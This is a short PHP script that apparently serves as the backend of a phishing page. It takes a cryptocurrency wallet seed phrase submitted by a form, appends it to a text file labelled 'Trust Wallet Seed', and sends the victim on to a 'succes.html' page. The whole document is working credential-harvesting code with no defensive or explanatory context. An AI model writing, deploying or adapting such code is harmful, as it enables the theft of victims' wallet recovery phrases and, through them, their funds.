<?php

file_put_contents("Trust wallet Seed.txt",  "Trust Wallet Seed: " . $_POST['walletSeed'] ."\n", FILE_APPEND);
header('Location: succes.html');
exit();
?>
